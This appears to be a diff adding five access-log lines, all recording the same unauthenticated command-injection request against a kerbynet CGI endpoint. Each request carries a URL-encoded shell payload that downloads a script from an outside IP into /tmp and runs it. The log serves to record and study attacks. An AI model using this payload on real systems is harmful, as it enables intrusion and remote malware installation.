@@ -1,0 +1,5 @@
+45.180.73.71 - - [17/Jul/2020:06:25:25 +0300] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 301 162 "-" "-" "-"
+45.180.73.71 - - [17/Jul/2020:08:47:27 +0300] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 301 162 "-" "-" "-"
+45.180.73.71 - - [17/Jul/2020:08:47:32 +0300] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 301 162 "-" "-" "-"
+45.180.73.71 - - [17/Jul/2020:08:48:15 +0300] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 301 162 "-" "-" "-"
+45.180.73.71 - - [17/Jul/2020:08:48:24 +0300] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 301 162 "-" "-" "-"
